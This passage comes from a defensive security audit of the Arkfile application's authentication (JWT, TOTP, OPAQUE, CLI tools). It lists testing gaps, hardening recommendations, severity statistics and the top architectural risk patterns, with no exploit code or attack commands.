7. **`config/security_config.go` startup behaviour.** Does it refuse to start the server if `ARKFILE_ENV=production` AND `ADMIN_DEV_TEST_API_ENABLED=true` are both set? A-14 should fail-closed here.
8. **`arkfile-admin` pipe-mode timeout.** Was the missing timeout (vs. `arkfile-client`'s 10 s) intentional? If so, what use case requires it?
9. **Browser TOTP setup screen lifetime.** Once the user clicks "Done", is the section's `innerHTML` cleared, or hidden via `display: none`? A-22 assumes the worst; please confirm.
10. **`/api/admin-contacts` exposure.** Public unauthenticated route that returns admin contact info. Is this intentional? A targeted attacker reading this learns the admin usernames (cross-ref A-24 admin enumeration). Slice E will deep-audit.

---

## 6. Testing gaps

(Items where adding a test would have caught the corresponding finding or would lock in the fix.)

1. **JWT audience claim is enforced at the validator** (A-01). No test asserts that an invalid `aud` is rejected.
2. **`RequiresTOTP=true` token is rejected by `RequireTOTP`, `AdminMiddleware`, and all protected groups** (A-01, A-02).
3. **`/api/admin/*` rejects a temp post-OPAQUE token** (A-02).
4. **Bootstrap token is consumed atomically on first use** (A-13).
5. **`IsUserJWTRevoked` is honored on a per-request basis** (A-09; today the *absence* of the check is intentional but undocumented to users).
6. **Refresh-token entropy is 256-bit** (A-10).
7. **Refresh-token rotation reuse-detection** (A-10).
8. **`/api/logout` requires auth** (A-33).
9. **`/api/opaque/login/response` returns indistinguishable responses for existent vs non-existent users** (A-24).
10. **No fuzz/property test for the CGO boundary** in `auth/opaque_wrapper.c` (length, NULL, oversize, group-element-invalid inputs).
11. **DEBUG_MODE never prints raw tokens or backup codes** (A-11, A-42).
12. **`models.User.Delete()` cascades cleanup** of refresh tokens / TOTP / files / shares (A-12).
13. **Unicode-normalized usernames are stored canonically** (A-29).
14. **TOTP `Skew = 1` accepts codes from the previous and next windows** (A-37).
15. **Per-user TOTP failure lockout** (A-08).
16. **Race: concurrent backup-code submission** (A-16).
17. **Backup codes are stored hashed, not encrypted** (A-07; schema-level test).
18. **`totpMasterKey` is mlock'd at startup** (A-17).
19. **`decodeBase64IfNeeded` does not corrupt valid AES-GCM ciphertext** (A-19); property test.
20. **Backup-code modulo bias** (A-42); statistical test on 10^6 codes.
21. **`CompleteTOTPSetup` writes to the replay log** (A-20).
22. **Lost-device TOTP recovery flow** (A-15).
23. **`--totp-secret` argv is not exposed via `/proc/<pid>/cmdline`** (A-06); after mitigation, assert the flag emits a deprecation warning.
24. **`arkfile-admin readPassword` returns `[]byte` and zeroes** (A-3).
25. **Agent rejects same-UID different-PID connections without `SO_PEERCRED` match** (A-21).
26. **Atomic session-file writes on initial login** (A-43); SIGKILL between write and rename.
27. **`window.totpLoginData` is undefined during TOTP flow** (A-04); Playwright.
28. **JWT is in HttpOnly cookie, not localStorage** (A-05); Playwright after fix.
29. **Backup codes removed from DOM after the user clicks "Done"** (A-22).
30. **Negative test for taken-username registration** (A-25); same shape as successful-up-to-different-failure.

---

## 7. Hardening / non-vulnerability recommendations

(Items that improve posture but are not directly tied to a finding above.)

1. **Pin the JWT validator's expected audience** via `echojwt.Config.ParseTokenFunc`. Drop dependency on application-layer claim inspection. (Addresses A-01.)
2. **Shorten the temp TOTP token TTL from 20 minutes to 5 minutes.** Per `idsrp.md` §22.2 "minutes, not hours."
3. **Shorten the full JWT TTL** to 5-10 minutes, paired with the per-request user-wide revocation middleware fix (A-09).
4. **Use separate Ed25519 keys for temp vs full JWT.** Two KeyManager entries: `jwt_signing_key_temp_v1` and `jwt_signing_key_full_v1`. Makes A-01 structurally impossible.
5. **Add a `RequireFullJWT` middleware** as defense-in-depth on `totpProtectedGroup`, `adminGroup`, and `pendingAllowedGroup`. Explicit positive check at each gateway.
6. **Audit every `C.CBytes(<sensitive>)` call** and wrap with a `zeroAndFreeC` helper that `memset(0)`s before `free`.
7. **Audit DEBUG_MODE-gated log statements globally.** A-11 is one instance; expect more.
8. **Replace `c.RealIP()` localhost check** with a Unix-socket-based admin listener, or a strict `net.IPNet{127.0.0.0/8, ::1/128}` check directly on the `net.Conn`. Slice F to examine Caddy.
9. **Document the recovery model.** Lost authenticator + lost backup codes = lost account. This is deliberate; documenting it discourages future "let me build an admin reset" code that would weaken the model.
10. **Match `arkfile-admin` and `arkfile-client` interfaces.** `readPassword` signature, pipe timeout, password lifecycle — both CLIs must be symmetric. Cross-implementation drift is a long-term security debt.
11. **Move bearer tokens out of localStorage** into `__Host-` HttpOnly cookies; tighten CSP; add Trusted Types.
12. **CSP audit** (Slice F): forbid eval'd scripts, third-party origins, `unsafe-inline`. Add `require-trusted-types-for 'script'`.
13. **TOTP master key rotation procedure** (Open Q6).
14. **`mlock` + `MADV_DONTDUMP` + `PR_SET_DUMPABLE=0`** on every server-side process that holds long-lived secrets. Match the CLI agent's pattern.
15. **TOTP backup-code length to 14 characters** (~65 bits). Essentially free for the user; meaningfully harder to brute force.
16. **Per-user TOTP failure counter on `user_totp`**. Combined with lockout (A-08), produces an observable account state.
17. **Atomic write everywhere session-file is written.** Match `atomicSaveAuthSession` semantics in both CLIs (A-43).
18. **Module-private password retention in browser**; never put password on `window` (A-04).
19. **Clear TOTP setup screen** after user confirms saved (A-22).
20. **`--secret-file` for TOTP secret display** instead of `--show-secret` to stdout (A-23).

---

## 8. Summary statistics

By severity:

| Severity | Count |
|---|---:|
| Critical | 1 |
| High | 12 |
| Medium | 21 |
| Low | 9 |
| Informational | 2 |
| **Total** | **45** |

By category (findings may count in multiple):

| Category | Count |
|---|---:|
| authorization | 11 |
| cryptographic / protocol correctness | 9 |
| privacy / data exposure | 8 |
| memory-safety | 5 |
| design / greenfield-policy | 5 |
| operational / robustness | 4 |
| frontend | 4 |
| race / atomicity | 2 |
| code hygiene | 2 |

By component (top hits):

| Component | Count |
|---|---:|
| `auth/totp.go` + `crypto/totp_keys.go` | 9 |
| `handlers/auth.go` + `handlers/middleware.go` + `handlers/route_config.go` | 11 |
| `cmd/arkfile-client/**` | 6 |
| `cmd/arkfile-admin/main.go` | 3 |
| `client/static/js/src/auth/**` + `utils/auth.ts` | 4 |
| `auth/jwt.go` + `auth/keys.go` + `auth/token_revocation.go` | 5 |
| `auth/opaque*.go` + `auth/bootstrap.go` + `auth/dev_admin.go` | 5 |
| `models/user.go` + `models/refresh_token.go` | 3 |

The top architectural patterns at the end of Slice A, in order of severity-times-confidence:

1. **A-01: Two-tier JWT model not enforced.** Critical, High confidence. Without the validator-level audience check, mandatory TOTP is structurally optional. The single highest-leverage fix in the entire slice.
2. **A-07 + A-05: Backup codes reversibly encrypted server-side; JWTs localStorage-readable client-side.** Two High-severity findings hitting the same threat — a single compromise of either layer collapses TOTP. Both fixes are independent and both should land.
3. **A-02 + A-04 + A-08: Admin compromise via password alone.** A-02 lets a temp token reach `/api/admin/*`; A-08 means no per-user TOTP lockout (so even after A-01 fixes the audience, brute force is feasible); A-04 gives an XSS or supply-chain attacker the password directly. Combined risk: admin takeover via any of three independent failure paths.
4. **A-03 + A-06 + A-23: CLI ergonomics that leak credentials.** Admin password as immutable string, TOTP secret as argv flag, TOTP secret printed to stdout. None individually critical; collectively they constitute the "Arkfile CLI was easy to script, and you scripted yourself into a corner" failure mode.

Every other finding is individually addressable; the four patterns above are the architectural ones that warrant a single coordinated fix campaign.
